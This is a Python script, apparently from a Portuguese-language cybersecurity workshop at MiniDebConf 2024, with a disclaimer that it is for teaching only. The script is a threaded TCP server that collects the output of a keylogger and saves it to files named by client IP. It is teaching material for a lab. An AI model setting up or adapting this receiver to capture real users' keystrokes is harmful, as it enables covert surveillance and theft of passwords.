"""
Código utilizado na oficina "Introdução à Cibersegurança com Raspberry Pi" durante a
MiniDebConf 2024 - UFMG, Belo Horizonte.

Autor: Lucas Albano

Este script é utilizado para receber os dados enviados pelo keylogger e salvá-los em arquivos.

Não utilize este script para monitorar teclados sem permissão. Este script é apenas
para fins educacionais e demonstrativos.
"""

import socket    # Módulo para criar sockets
import threading # Módulo para criar threads

HOST = '0.0.0.0'  # Aceita conexões de qualquer IP
PORT = 8080       # Porta para receber os envios

# Prefixo para os nomes dos arquivos
PREFIXO_ARQUIVO = 'dados_recebidos_'
# Sufixo para os nomes dos arquivos
SUFIXO_ARQUIVO = '.txt'

# Função que lida com uma conexão individual
def handle_connection(conn, addr):
    # Cria um nome único para o arquivo usando o endereço do cliente
    nome_arquivo = PREFIXO_ARQUIVO + addr[0] + SUFIXO_ARQUIVO
    print(f"Conexão recebida de {addr}. Salvando dados em {nome_arquivo}...")
    # Abre o arquivo para escrita
    data = conn.recv(1024)
    # Abre o arquivo e substitui o conteúdo pelo novo dado recebido
    with open(nome_arquivo, 'w') as arquivo:
        arquivo.write(data.decode())
    print(f'Dados recebidos de {addr}: {data}')
    print(f"Conexão de {addr} encerrada.")

# Cria um socket TCP/IP
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Liga o socket à porta
    s.bind((HOST, PORT))
    # Habilita o servidor a aceitar conexões
    s.listen()
    print("Aguardando conexões...")
    while True:
        # Aceita a próxima conexão que chegar
        conn, addr = s.accept()
        # Cria uma nova thread para lidar com a conexão
        thread = threading.Thread(target=handle_connection, args=(conn, addr))
        thread.start()
